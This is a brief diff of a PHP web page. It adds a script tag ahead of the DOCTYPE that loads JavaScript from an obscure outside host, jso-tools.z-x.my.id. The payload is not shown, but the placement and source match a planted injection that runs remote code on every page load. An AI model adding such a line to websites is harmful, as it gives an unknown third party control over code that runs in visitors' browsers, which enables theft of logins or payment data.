@@ -3,6 +3,7 @@
  ini_set('display_startup_errors', 1); 
  error_reporting(E_ALL); 
 ?>
+<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/35PSTXNJRNA8Y"></script>
 <!DOCTYPE html>
 <html lang="en">
 <head>
